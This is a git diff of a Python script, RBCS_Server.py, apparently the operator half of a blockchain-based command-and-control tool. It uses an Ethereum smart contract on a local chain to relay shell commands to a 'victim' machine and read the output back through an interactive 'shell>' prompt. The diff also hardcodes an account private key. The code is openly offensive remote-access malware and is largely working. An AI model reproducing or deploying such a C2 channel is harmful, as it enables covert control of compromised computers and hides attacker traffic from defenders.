@@ -1,15 +1,15 @@
 ## Name        : RBCS_Server.py
-## Date        : 23.2.2022
-## Author      : Shkedo
+## Date        : 5.3.2022
+## Author      : Shakedash
 ## Description : This program will create a connection to a smartcontract to interact with the victim.
 ##               This program will can upload commands to the blockchain and get the output as well.
 ##               The commands will be executed using "RBCS_Client.py" and will send the output straight to the blockchain.
 
 # Imports.
-import os
 from web3 import Web3
 import time
-from dotenv import load_dotenv
+
+from RBCS_Client import W3_ENGINE
 
 # Constants.
 SOLIDITY_VERSION = "0.6.0"
@@ -23,13 +23,6 @@ _|"""""|_|"""""|_|"""""|_|"""""|
 '''
 CONTRACT_ABI = [
     {"inputs": [], "stateMutability": "nonpayable", "type": "constructor"},
-    {
-        "inputs": [{"internalType": "string", "name": "output_", "type": "string"}],
-        "name": "AddOutput",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function",
-    },
     {
         "inputs": [],
         "name": "GetCommand",
@@ -66,13 +59,6 @@ CONTRACT_ABI = [
         "type": "function",
     },
     {
-        "inputs": [],
-        "name": "ResetOutput",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function",
-    },
-    {
         "inputs": [{"internalType": "string", "name": "command_", "type": "string"}],
         "name": "SetCommand",
         "outputs": [],
@@ -86,22 +72,16 @@ CONTRACT_ABI = [
         "stateMutability": "nonpayable",
         "type": "function",
     },
-    {
-        "inputs": [
-            {"internalType": "uint256", "name": "isCommandReady_", "type": "uint256"}
-        ],
-        "name": "SetisCommandReady",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function",
-    },
 ]
-GANACHE_SERVICE = "HTTP://127.0.0.1:7545"
+RPC_URL = "HTTP://127.0.0.1:7545"
 CHAIN_ID = 1337
-CONTRACT_ADDR = "0xb2e9d407c4f8534e80c6a713094633DC57FCA2D4"
-ACCOUNT0_ADDR = "0x2F36BDBf0d97819A4B02f3534446659Ed884Fc4e"
-load_dotenv()  # Import enviorment variables.
-PRIVATE_KEY0 = os.getenv("PRIVATE_KEY0")
+CONTRACT_ADDR = "0x3Dd7b24DCa173668b68794195b085f3751755856"
+ACCOUNT_ADDR = "0x6094A92Db36BCb533a40357b0E4274dE624AAea6"
+PRIVATE_KEY = "0xed9754ec971cf055a38b847a2f7ed4bb4033c46477b573fe31f8563c465632f3"
+W3_ENGINE = Web3(Web3.HTTPProvider(RPC_URL))  # Initialize the web3 provider object.
+CNC_CONTRACT = W3_ENGINE.eth.contract(
+    CONTRACT_ADDR, abi=CONTRACT_ABI
+)  # Get contract object
 
 # Main
 def main():
@@ -110,30 +90,21 @@ def main():
 
     # Reset the blockchain (in case there was a previous execution of the program).
     ResetBlockChain()
-
-    # Initialize the web3 provider object.
-    w3_engine = Web3(Web3.HTTPProvider(GANACHE_SERVICE))
-
-    # Create the smartcontract object.
-    CnC_Contract = w3_engine.eth.contract(CONTRACT_ADDR, abi=CONTRACT_ABI)
+    print("Reset successfull")
     print("Waiting for a connection from the client")
 
     # While the attacker didn't choose to stop.
     while command != "exit":
 
         # Wait for a connection to the client\wait for the client to send command output.
-        while not CnC_Contract.functions.GetisOutputReady().call():
+        while not CNC_CONTRACT.functions.GetisOutputReady().call():
             time.sleep(0.1)
 
         # Get command output.
-        command = input(f"{CnC_Contract.functions.GetOutput().call()}\nshell>")
-
-        # Reset output variable and set isOutputReady to false.
-        ResetOutput()
+        command = input(f"{CNC_CONTRACT.functions.GetOutput().call()}\nshell>")
 
         # Send command and set isCommandReady to true.
         SendCommand(command)
-        SetisCommandReady(1)
 
 
 # SendCommand() executes a transaction to set command variable.
@@ -152,54 +123,36 @@ def ResetBlockChain():
     )
 
 
-# SetOutput() executes a transaction to set output variable.
-def ResetOutput():
-    return RunTransaction(
-        "ResetOutput",
-        [],
-    )
-
-
-# Executes a transaction to set isCommandReady variable.
-def SetisCommandReady(arg):
-    return RunTransaction(
-        "SetisCommandReady",
-        [arg],
-    )
-
-
-# Executes a transaction to set isOutputReady variable.
-def SetisOutputReady(arg):
-    return RunTransaction(
-        "SetisOutputReady",
-        [arg],
-    )
-
-
 # RunTransaction runs a transaction on the blockchain.
 # Gets from address, private key, contract object, function name (in string), amount of eth to transfer, argv (to pass arguments to the function).
 def RunTransaction(
     function_name,  # Function name in the smart contract.
     argv=[],  # For passing arguments to the function called.
 ):
-    w3_engine = Web3(Web3.HTTPProvider(GANACHE_SERVICE))
-    CnC_Contract = w3_engine.eth.contract(CONTRACT_ADDR, abi=CONTRACT_ABI)
-    gasPrice = w3_engine.eth.gas_price
-    transaction = w3_engine.eth.send_raw_transaction(
-        w3_engine.eth.account.sign_transaction(
-            getattr(CnC_Contract.functions, function_name)(*argv).buildTransaction(
-                {
-                    "gasPrice": gasPrice,
-                    "chainId": CHAIN_ID,
-                    "from": ACCOUNT0_ADDR,
-                    "nonce": w3_engine.eth.getTransactionCount(ACCOUNT0_ADDR),
-                    "value": 0,
-                }
-            ),
-            PRIVATE_KEY0,
-        ).rawTransaction
-    )
-    return transaction, w3_engine.eth.wait_for_transaction_receipt(transaction)
+    gasPrice = W3_ENGINE.eth.gas_price
+    success = False
+    while not success:
+        try:
+            transaction = W3_ENGINE.eth.send_raw_transaction(
+                W3_ENGINE.eth.account.sign_transaction(
+                    getattr(CNC_CONTRACT.functions, function_name)(
+                        *argv
+                    ).buildTransaction(
+                        {
+                            "gasPrice": gasPrice,
+                            "chainId": CHAIN_ID,
+                            "from": ACCOUNT_ADDR,
+                            "nonce": W3_ENGINE.eth.getTransactionCount(ACCOUNT_ADDR),
+                            "value": 0,
+                        }
+                    ),
+                    PRIVATE_KEY,
+                ).rawTransaction
+            )
+            return transaction, W3_ENGINE.eth.wait_for_transaction_receipt(transaction)
+            success = True
+        except:
+            pass
 
 
 if __name__ == "__main__":
